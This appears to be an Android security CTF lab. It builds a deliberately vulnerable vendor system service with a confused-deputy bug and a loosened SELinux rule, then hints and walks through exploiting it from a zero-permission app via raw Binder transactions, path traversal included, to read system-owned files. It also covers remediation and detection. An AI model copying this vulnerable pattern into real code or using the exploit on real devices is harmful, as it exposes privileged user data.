# Lab 05 — CTF: The vendor's back door

**Difficulty:** Advanced
**Time:** 3–5 hours
**Chapter:** [07 — AOSP](../README.md) — everything in §3.5, §3.6, §4.1, §5.3.1, §5.3.2, §6.2

---

## The scenario

You are handed a device — or an image — from "Vendor X". The client says:

> "It's stock Android with a few of our own apps on top. We had it reviewed last year. There's nothing
> in the framework."

There is a flag. It is readable only by a process running as UID 1000, and it is reachable from an
application that holds **no permissions at all**.

**Flag format:** `FLAG{...}`

---

## Rules

- Analyse only the provided device or image.
- The attacking application may declare **no permissions**. If you find yourself adding one, you have
  taken a wrong turn.
- No root on the target. `adb shell` is unprivileged.
- Do not brute-force transaction codes against services you have not identified. Read the challenge
  construction note below on why.

---

## Building the challenge

This lab ships as a recipe rather than an image, so you can build it, break it, and then read exactly how
it was constructed. **Have someone else build it for you if you can** — the challenge is much better if
you have not seen the source.

<details>
<summary><b>Challenge construction (spoilers — do not open if you are solving it)</b></summary>

Start from a built AOSP tree (see [Lab 02](lab-02-build-and-boot-aosp.md)).

**1. Plant the flag** where only UID 1000 can read it:

```bash
# In the device's file_contexts / a prebuilt_etc module, or simply post-boot as root:
echo 'FLAG{clear_calling_identity_before_the_check}' > /data/system/vendor_diag.txt
chmod 600 /data/system/vendor_diag.txt
chown system:system /data/system/vendor_diag.txt
```

**2. Add a vendor system service** with the confused-deputy bug from
[§5.3.2](../README.md#532-the-confused-deputy-across-clearcallingidentity).

`frameworks/base/core/java/com/vendorx/IDeviceCare.aidl`:

```java
package com.vendorx;

interface IDeviceCare {
    String getDeviceInfo();                       // code 1 — benign, no check
    String readDiagnosticFile(String path);       // code 2 — the bug
    void setDiagnosticMode(boolean enabled);      // code 3 — properly guarded
}
```

`frameworks/base/services/core/java/com/android/server/vendorx/DeviceCareService.java`:

```java
public class DeviceCareService extends IDeviceCare.Stub {
    private static final String TAG = "DeviceCareService";
    private final Context mContext;

    public DeviceCareService(Context context) { mContext = context; }

    @Override
    public String getDeviceInfo() {
        // Deliberately benign, and deliberately unguarded, so the service
        // answers something and encourages further probing.
        return Build.MODEL + "/" + Build.FINGERPRINT;
    }

    @Override
    public String readDiagnosticFile(String path) {
        // THE BUG. The identity is cleared FIRST, so getCallingUid() below
        // returns 1000 (system) rather than the caller's UID, and the check
        // passes for everybody.
        //
        // Also: `path` is caller-controlled and never canonicalised.
        final long token = Binder.clearCallingIdentity();
        try {
            if (mContext.checkCallingPermission("com.vendorx.permission.DIAGNOSTICS")
                    != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("DIAGNOSTICS permission required");
            }
            return new String(Files.readAllBytes(Paths.get(path)),
                              StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new IllegalArgumentException("cannot read: " + e.getMessage());
        } finally {
            Binder.restoreCallingIdentity(token);
        }
    }

    @Override
    public void setDiagnosticMode(boolean enabled) {
        // Correct: the check happens BEFORE any identity manipulation.
        mContext.enforceCallingPermission(
                "com.vendorx.permission.DIAGNOSTICS", "setDiagnosticMode");
        SystemProperties.set("persist.vendorx.diag", enabled ? "1" : "0");
    }
}
```

**3. Register it** in `SystemServer.java`, in `startOtherServices()`:

```java
        ServiceManager.addService("vendorx.devicecare",
                new DeviceCareService(context));
```

**4. Make it reachable by `untrusted_app`** in SELinux — the loosening that turns a bug into a
vulnerability. In `device/google/cuttlefish/shared/sepolicy/private/`:

```
# service_contexts
vendorx.devicecare  u:object_r:vendorx_devicecare_service:s0
```

```
# untrusted_app.te  — this is the deliberate mistake
allow untrusted_app vendorx_devicecare_service:service_manager find;
```

**5. Declare the permission weakly** (a second, independent finding), in
`frameworks/base/core/res/AndroidManifest.xml`:

```xml
    <permission android:name="com.vendorx.permission.DIAGNOSTICS"
                android:protectionLevel="signature|privileged" />
```

(Leave this one *correct*, so the confused deputy is the actual route in. Set it to `normal` for an
easier variant.)

**6. Build and boot:**

```bash
m services framework && m snod
stop_cvd && launch_cvd --daemon
adb root
adb shell 'echo "FLAG{clear_calling_identity_before_the_check}" > /data/system/vendor_diag.txt'
adb shell chmod 600 /data/system/vendor_diag.txt
adb shell chown system:system /data/system/vendor_diag.txt
adb unroot
```

**Difficulty knobs:**
- Do not tell the solver the service name; make them enumerate.
- Give the service a dull name that resembles an AOSP one (`vendor_config`, `diagnostics`).
- Add three decoy services that are properly guarded.
- Ship the vendor's client SDK as an obfuscated jar so the transaction codes must be recovered by
  observation rather than by reading `TRANSACTION_` constants.
- Put the flag behind a path-traversal requirement: allow only `/data/vendorx/*` by prefix check,
  and let `../` escape it.

</details>

---

## Guided route

Work through these in order. Stop reading as soon as you have a lead.

<details>
<summary><b>Hint 1 — establish what you are holding</b></summary>

```bash
# adb shell
getprop ro.build.fingerprint
getprop ro.build.version.release
getprop ro.build.version.sdk
getprop ro.build.type
getenforce
```

Map the build to an AOSP tag and **set that branch in cs.android.com**. Everything you read from now on
must match this release.

```bash
# host — or just run the script
./07-AOSP/scripts/aosp-device-recon.sh -o evidence/
```
</details>

<details>
<summary><b>Hint 2 — the two-minute diff that finds it</b></summary>

The vendor's addition is not in AOSP, so it will not be in a stock device's service list.

```bash
# adb shell — on the TARGET
service list | awk '{print $2}' | tr -d ':' | sort -u > /sdcard/target.txt
```

```bash
# on a stock Pixel or Cuttlefish of the SAME release
adb shell service list | awk '{print $2}' | tr -d ':' | sort -u > baseline.txt
```

```bash
# host
adb pull /sdcard/target.txt
comm -23 <(sort -u target.txt) <(sort -u baseline.txt)
```

Everything in the output is code the vendor added, running as UID 1000, reachable over Binder, and never
reviewed by Google. See [§5.3.1](../README.md#531-the-oem-system-service-with-no-permission-check).

[`../scripts/binder-service-enum.sh`](../scripts/binder-service-enum.sh) does this and also prints each
service's interface descriptor.
</details>

<details>
<summary><b>Hint 3 — get the interface descriptor</b></summary>

You need the exact descriptor string for `writeInterfaceToken`. Without it the server's
`enforceInterface` rejects your transaction.

```bash
# adb shell
service list -l | grep -A1 -i <servicename>
```

Or from an app, via `ServiceManager.getService(name)` then `IBinder.getInterfaceDescriptor()` — which is
what [`../examples/03-binder-service-probe/BinderProbe.kt`](../examples/03-binder-service-probe/BinderProbe.kt)
prints for every registered service.
</details>

<details>
<summary><b>Hint 4 — read the implementation</b></summary>

The service is implemented in `system_server`, so it is in `services.jar`.

```bash
# host
adb pull /system/framework/services.jar
jadx -d svc services.jar
rg -n "extends .*[$]Stub" svc/sources/ | grep -vi "com/android/server/[apw]m"
```

If `services.jar` decompiles to almost nothing, the real DEX is pre-compiled — extract it from the vdex
first (needs root on the device, or take it from the image):

```bash
adb shell oatdump --vdex-file=/system/framework/oat/arm64/services.vdex \
                  --export-dex-to=/data/local/tmp/svc
adb pull /data/local/tmp/svc && jadx -d svc svc/*.dex
```

See [§6.2](../README.md#62-diffing-an-oem-framework-against-aosp).
</details>

<details>
<summary><b>Hint 5 — the highest-yield grep in the chapter</b></summary>

```bash
# host
rg -n -A25 "clearCallingIdentity" svc/sources/ | grep -E "checkCalling|enforceCalling"
```

Read every hit and ask one question: **is the permission check before or after the clear?**

`Binder.clearCallingIdentity()` makes subsequent `getCallingUid()` calls return the *system's* UID. A
check placed after it validates the system's identity, not the caller's, and therefore passes for
everybody. See [§5.3.2](../README.md#532-the-confused-deputy-across-clearcallingidentity).
</details>

<details>
<summary><b>Hint 6 — get the transaction code</b></summary>

Codes are assigned by the AIDL compiler in declaration order from
`IBinder.FIRST_CALL_TRANSACTION` (1). Three ways to get one, in order of reliability:

1. **From the decompiled Stub.** `rg -n "TRANSACTION_" svc/sources/com/vendorx/` gives you names *and*
   codes.
2. **From the vendor's client SDK**, if one is on the device. Decompile it and look for the same
   constants.
3. **By observation.** Attach [`../scripts/binder-trace.js`](../scripts/binder-trace.js) to
   `system_server` with `FILTER_INTERFACE` set to the vendor's descriptor, then exercise the vendor's
   own app. Every method it calls is printed with its code.

**Do not brute-force.** Calling an unknown service with an arbitrary code can crash `system_server` and
reboot the device — which is itself a finding, but only if you meant to produce it.
</details>

<details>
<summary><b>Hint 7 — call it</b></summary>

Build an app that declares **no permissions** (see
[`../examples/03-binder-service-probe/AndroidManifest.xml`](../examples/03-binder-service-probe/AndroidManifest.xml))
and make the call by raw `Parcel` transaction:

```kotlin
val sm = Class.forName("android.os.ServiceManager")
val binder = sm.getMethod("getService", String::class.java)
              .invoke(null, "<servicename>") as android.os.IBinder

val data = android.os.Parcel.obtain()
val reply = android.os.Parcel.obtain()
try {
    data.writeInterfaceToken("<the.exact.Interface.Descriptor>")   // MANDATORY
    data.writeString("<the argument>")
    binder.transact(<code>, data, reply, 0)
    reply.readException()          // throws if the service refused
    Log.i("PROBE", reply.readString() ?: "(null)")
} finally {
    data.recycle(); reply.recycle()
}
```

If `ServiceManager` itself is denied, that is the hidden-API blocklist —
`adb shell settings put global hidden_api_policy 1`, and reset it afterwards. See
[§3.8](../README.md#38-the-hidden-api-blocklist).
</details>

<details>
<summary><b>Hint 8 — you can reach it but the file is not where you expected</b></summary>

The method takes a path. Two things follow:

- The service runs as UID 1000 with the system SELinux domain, so it can read files your app cannot.
  Anything readable by `system` is in scope: `/data/system/packages.xml`, `/data/system/*`, and whatever
  the vendor put there.
- If the implementation validates the path by prefix rather than by canonicalising it, `../` escapes the
  intended directory.

```
/data/system/vendor_diag.txt
/data/vendorx/../system/vendor_diag.txt
/data/system/packages.xml            <- also worth reading; see README 5.7
```
</details>

---

## Solution structure (spoilers)

<details>
<summary><b>Full walkthrough</b></summary>

1. **Establish identity.** `ro.build.fingerprint` gives the release; set the matching branch in Code
   Search so everything you read is comparable.

2. **Diff the service list** against a stock device of the same release. `vendorx.devicecare` appears on
   the target and not on the baseline. That is two minutes of work and it is the whole finding, located.

3. **Get the interface descriptor** with `service list -l`, or from `getInterfaceDescriptor()` in the
   probe app: `com.vendorx.IDeviceCare`.

4. **Decompile `services.jar`** (extracting from `services.vdex` first if needed) and find
   `DeviceCareService extends IDeviceCare$Stub`.

5. **Read every public method** for enforcement. `getDeviceInfo` has none but is harmless.
   `setDiagnosticMode` calls `enforceCallingPermission` correctly, before any identity manipulation.
   `readDiagnosticFile` calls `clearCallingIdentity()` **and then** `checkCallingPermission` — so the
   check evaluates the system's identity and passes for every caller. Confused deputy.

6. **Recover the transaction code** from the decompiled Stub's `TRANSACTION_readDiagnosticFile` constant
   (2), or by tracing the vendor's own app.

7. **Call it from a zero-permission app** with the correct interface token, passing
   `/data/system/vendor_diag.txt`. The service reads the file as UID 1000 and returns its contents.

8. **Flag.**

**Why the previous review missed it.** They looked at the applications. The vulnerability is in
`system_server` — code the vendor added to the *framework*, not to an app. Neither an APK scan nor a
manifest review would ever have reached it. It is found by diffing the service list and reading the
framework, and both are two-minute operations that are simply not on most checklists.

</details>

---

## Success criteria

- [ ] You recovered `FLAG{...}`.
- [ ] Your attacking app's manifest contains **zero** `<uses-permission>` elements, and you can show it.
- [ ] You can name the added service, its interface descriptor, and the transaction code you used.
- [ ] You can point at the exact line that is wrong and explain in one sentence why it is wrong.
- [ ] You identified **at least one further issue** in the same service beyond the confused deputy.
- [ ] You checked the SELinux side and can say whether policy was also loosened.

---

## Write it up

Produce the finding as you would deliver it to the client:

1. **Title** — name the mechanism, not the symptom. "Confused deputy in `DeviceCareService` permits
   arbitrary file read as UID 1000 from an unprivileged application" is a title. "Insecure service" is
   not.
2. **Affected component** — service name, interface descriptor, implementing class, and the file it came
   from (`/system/framework/services.jar`, or the vdex).
3. **Root cause** — the `clearCallingIdentity` ordering, quoted. Explain what `getCallingUid()` returns
   after the clear and why that makes the check unconditional.
4. **Reproduction** — the exact code, and the manifest showing no permissions.
5. **Impact** — arbitrary file read with the privileges of UID 1000 and the `system` SELinux domain, from
   any app on the device, with no user interaction and no prompt. Enumerate what that reaches
   (`/data/system/packages.xml` alone contains every installed package's signing certificate and granted
   permissions).
6. **Severity, with reasoning** — use the table in
   [§5.3.2](../README.md#532-the-confused-deputy-across-clearcallingidentity) and defend your rating.
7. **Remediation as code** — the corrected method, with the check first, the caller's UID captured
   explicitly, path canonicalisation and containment, and identity cleared only around the privileged
   operation.
8. **Defence in depth** — the SELinux rule that should not have granted `untrusted_app` the `find`
   permission on this service, written out.
9. **Process recommendation** — the grep that would have caught this in CI:
   ```bash
   rg -n -A25 "clearCallingIdentity" <framework-src> | grep -E "checkCalling|enforceCalling"
   ```
   and the observation that it should run on every framework change.

---

## Extension challenges

1. **Find the second bug.** `readDiagnosticFile` has more than one problem. Identify it and demonstrate
   it.
2. **Close it and prove the fix.** Patch the service, rebuild with `m services && m snod`, and
   demonstrate that the same attacking app now receives a `SecurityException`.
3. **Close it at the policy layer instead.** Leave the Java bug in place, remove the `untrusted_app`
   `find` rule from SELinux, rebuild, and demonstrate that the app can no longer obtain the binder at
   all. Then write one paragraph on defence in depth: which fix is better, and why you would recommend
   both.
4. **Automate the detection.** Extend
   [`../scripts/binder-service-enum.sh`](../scripts/binder-service-enum.sh) so that, given a decompiled
   `services.jar`, it reports every vendor service method with no enforcement call in its body.
5. **Do it without the source.** Delete your decompiled copy and recover the transaction codes purely by
   attaching [`../scripts/binder-trace.js`](../scripts/binder-trace.js) to `system_server` and
   exercising the vendor's own application.
